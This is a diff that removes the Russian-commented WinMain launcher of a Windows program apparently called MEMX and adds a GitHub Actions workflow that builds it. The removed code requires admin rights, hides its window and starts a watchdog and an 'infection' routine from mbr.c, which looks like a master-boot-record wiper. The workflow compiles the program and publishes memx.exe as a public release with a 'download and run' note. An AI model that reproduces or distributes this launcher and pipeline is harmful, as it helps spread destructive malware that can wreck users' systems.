@@ -1,77 +1,48 @@
-#include <windows.h>
-#include <cstdio>
+name: Build MEMX
 
-#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
-#pragma comment(linker, "/ENTRY:WinMainCRTStartup")
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
 
-// ================================================================
-// ВНЕШНИЕ ОБЪЯВЛЕНИЯ
-// ================================================================
+permissions:
+  contents: write
 
-extern void StartEffects();      // из effects.cpp
-extern void StartWatchdog();     // из watchdog.cpp
+jobs:
+  build:
+    runs-on: windows-2022
 
-#ifdef __cplusplus
-extern "C" {
-#endif
-    int IsAdmin(void);
-    void StartInfection(void);   // из mbr.c
-#ifdef __cplusplus
-}
-#endif
+    steps:
+      - uses: actions/checkout@v4
 
-// ================================================================
-// ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
-// ================================================================
+      - name: Setup MSVC
+        uses: ilammy/msvc-dev-cmd@v1
 
-volatile bool g_running = true;
+      - name: Build memx.exe
+        shell: cmd
+        run: |
+          cl /EHsc /std:c++17 /GS- /O1 /MT main.cpp effects.cpp watchdog.cpp mbr.c ^
+          /link user32.lib gdi32.lib winmm.lib shell32.lib ole32.lib uuid.lib advapi32.lib urlmon.lib ^
+          /SUBSYSTEM:WINDOWS /ENTRY:WinMainCRTStartup /OUT:memx.exe
 
-// ================================================================
-// ТОЧКА ВХОДА
-// ================================================================
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: memx
+          path: memx.exe
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
-                   LPSTR lpCmdLine, int nCmdShow) {
-
-    // ====== РЕЖИМ WATCHDOG ======
-    if (strstr(lpCmdLine, "/watchdog")) {
-        while (TRUE) Sleep(5000);
-        return 0;
-    }
-
-    // ====== ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА ======
-    if (!IsAdmin()) {
-        MessageBoxA(NULL, "Run as administrator!", "MEMX", MB_ICONERROR);
-        return 1;
-    }
-
-    // ====== СОЗДАНИЕ СКРЫТОГО ОКНА ======
-    WNDCLASSA wc = {0};
-    wc.lpfnWndProc = DefWindowProcA;
-    wc.hInstance = hInstance;
-    wc.lpszClassName = "MEMXClass";
-    RegisterClassA(&wc);
-
-    HWND hwnd = CreateWindowExA(0, "MEMXClass", "MEMX",
-        WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT,
-        1, 1, NULL, NULL, hInstance, NULL);
-    ShowWindow(hwnd, SW_HIDE);
-
-    // ====== ЗАПУСК ЭФФЕКТОВ (из effects.cpp) ======
-    StartEffects();
-
-    // ====== ЗАПУСК WATCHDOG (из watchdog.cpp) ======
-    StartWatchdog();
-
-    // ====== ЗАПУСК ЗАРАЖЕНИЯ (из mbr.c) ======
-    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StartInfection, NULL, 0, NULL);
-
-    // ====== ЦИКЛ ОБРАБОТКИ СООБЩЕНИЙ ======
-    MSG msg;
-    while (g_running && GetMessage(&msg, NULL, 0, 0)) {
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
-    }
-
-    return 0;
-}
+      - name: Create Release
+        uses: softprops/action-gh-release@v1
+        with:
+          files: memx.exe
+          tag_name: memx-${{ github.run_id }}
+          name: "💀 MEMX Build #${{ github.run_number }}"
+          body: |
+            ## MEMX.exe
+            
+            Скачай и запусти.
+            Размер: ~191 КБ
+            
+            ⚠️ ТОЛЬКО ДЛЯ ВИРТУАЛКИ!
+          draft: false
+          prerelease: true
